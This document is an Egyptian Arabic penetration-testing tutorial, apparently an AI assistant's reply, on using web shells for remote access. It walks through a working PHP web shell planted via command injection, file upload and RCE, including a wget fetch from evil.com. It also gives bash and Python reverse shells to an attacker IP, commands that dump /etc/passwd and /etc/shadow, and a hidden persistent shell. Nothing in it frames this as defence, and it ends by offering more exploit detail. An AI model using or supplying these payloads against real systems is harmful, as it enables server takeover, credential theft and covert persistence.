تمام، هشرحلك القسم ده عن "الوصول عن بُعد عن طريق الـ Web Shells" (Gaining Remote Access via Web Shells) بعمق وعملي مع أكواد وأوامر، وبعد كل جزء هاديك خلاصة Pentest بالعامية المصرية، وفي الآخر هاديك سيناريوهات الاستغلال الممكنة.

---

### **1. فهم الـ Web Shells**
#### **شرح عملي:**
الـ Web Shell هي سكربت (غالبًا PHP، ASP، أو Python) بترفعه على السيرفر عشان تتحكم فيه عن بُعد. بتكون زي واجهة بسيطة بتكتب فيها أوامر نظام (زي `whoami` أو `ls`) أو تنفذ كود، وبتشتغل من خلال المتصفح أو طلبات HTTP.

- **الغرض:** بدل ما تعتمد على ثغرة مؤقتة، الـ Web Shell بتديك وصول دائم طالما موجودة على السيرفر.
- **كيف بترفعها؟** بتستغل ثغرات زي Command Injection، File Upload، أو RCE.

#### **كود عملي (Web Shell بسيطة بـ PHP):**
- سكربت PHP:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
- احفظها باسم `shell.php`، لو قدرت ترفعها على السيرفر (مثلاً في `/var/www/html`)، افتح:
```
http://<IP>/shell.php?cmd=id
```
- لو رجعلك `uid=33(www-data)`، يبقى الـ Web Shell شغالة!

#### **أمر عملي (تجربة يدوية):**
- لو رفعتها، جرب أوامر زي:
```bash
curl "http://<IP>/shell.php?cmd=whoami"
```
- لو رجعلك اسم المستخدم، يبقى تقدر تتحكم في السيرفر.

#### **خلاصة Pentest بالعامية:**
"لو لقيت ثغرة ترفع بيها ملف، ارفع سكربت زي `shell.php` وابدأ نفذ أوامر من المتصفح. لو شغال، يبقى السيرفر بقى بتاعك!"

---

### **2. رفع الـ Web Shell على السيرفر**
#### **شرح عملي:**
عشان تكسب وصول عن بُعد، لازم ترفع الـ Web Shell. ده بيحصل عن طريق استغلال ثغرات زي:
- **File Upload:** لو الموقع بيسمح برفع ملفات بدون فحص الامتداد.
- **Command Injection:** تكتب ملف الـ Shell على السيرفر.
- **RCE:** تنفذ أمر يحمل الـ Shell من موقعك.

#### **كود عملي (رفع عبر Command Injection):**
- لو فيه صفحة زي `ping.php` من المثال السابق:
```php
<?php
$output = shell_exec("ping -c 4 " . $_GET['ip']);
echo "<pre>$output</pre>";
?>
```
- ابعت طلب:
```bash
curl "http://<IP>/ping.php?ip=127.0.0.1; echo '<?php system(\$_GET[cmd]); ?>' > shell.php"
```
- افتح `http://<IP>/shell.php?cmd=id` وشوف النتيجة.

#### **كود عملي (رفع عبر File Upload):**
- لو فيه نموذج رفع ملفات:
```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit">
</form>
```
- وكود PHP ضعيف:
```php
<?php
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
?>
```
- ارفع `shell.php` بـ Burp Suite أو يدوي، وافتحه في `http://<IP>/uploads/shell.php?cmd=whoami`.

#### **خلاصة Pentest بالعامية:**
"جرب ترمي الـ Shell بأي طريقة، زي حقن أمر بـ `echo` أو رفع ملف لو الموقع بيسمح. لو نجحت، يبقى عندك باب خلفي للسيرفر!"

---

### **3. استخدام الـ Web Shell للوصول عن بُعد**
#### **شرح عملي:**
بعد ما ترفع الـ Shell، بتقدر تنفذ أوامر، تسحب ملفات، أو تفتح Reverse Shell عشان تتحكم بشكل كامل. الهدف إنك تبقى زي الـ Admin من المتصفح.

#### **كود عملي (Reverse Shell عبر Web Shell):**
- استخدم الـ Shell تنفذ Reverse Shell:
```
http://<IP>/shell.php?cmd=bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```
- شغل Netcat على جهازك:
```bash
nc -lvnp 4444
```
- لو اتفتحت الشاشة، يبقى خدت السيرفر كامل!

#### **أمر عملي (سحب ملفات):**
- جرب تسحب ملف حساس:
```bash
curl "http://<IP>/shell.php?cmd=cat /etc/passwd"
```
- لو رجعلك الملف، يبقى تقدر تسحب أي حاجة.

#### **خلاصة Pentest بالعامية:**
"لو الـ Shell شغالة، نفذ أوامر زي `cat` تشوف الملفات أو افتح Reverse Shell بـ Netcat تتحكم كأنك قاعد قدام السيرفر. الدنيا بقت في ايدك!"

---

### **سيناريوهات الاستغلال الممكنة (Exploitation Scenarios):**
1. **Via Command Injection:**
   - اكتب الـ Shell:
     ```bash
     curl "http://<IP>/ping.php?ip=127.0.0.1; echo '<?php system(\$_GET[cmd]); ?>' > /var/www/html/shell.php"
     ```
     استخدمها: `http://<IP>/shell.php?cmd=id`.

2. **Via File Upload:**
   - لو فيه Upload، غير امتداد الملف بـ Burp (مثلاً `shell.php.jpg` لـ `shell.php`)، ارفعه وافتحه:
     ```bash
     curl "http://<IP>/uploads/shell.php?cmd=whoami"
     ```

3. **Via RCE:**
   - لو فيه RCE، نفذ أمر يحمل الـ Shell:
     ```bash
     curl "http://<IP>/calc.php?calc=1; system('wget http://evil.com/shell.php -O /var/www/html/shell.php');"
     ```
     افتح: `http://<IP>/shell.php?cmd=ls`.

4. **مشترك:**
   - **Reverse Shell:** افتح Shell كامل:
     ```bash
     curl "http://<IP>/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<YOUR_IP>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     ```
     استمع بـ `nc -lvnp 4444`.
   - **File Exfiltration:** اسحب ملفات:
     ```bash
     curl "http://<IP>/shell.php?cmd=base64 /etc/shadow" | base64 -d
     ```
   - **Persistence:** ضيف الـ Shell لمكان دائم:
     ```bash
     curl "http://<IP>/shell.php?cmd=cp shell.php /var/www/html/.hidden.php"
     ```

---

لو عايز تفاصيل أكتر عن أي سيناريو أو كود استغلال معين، قوللي وأنا أفصلك!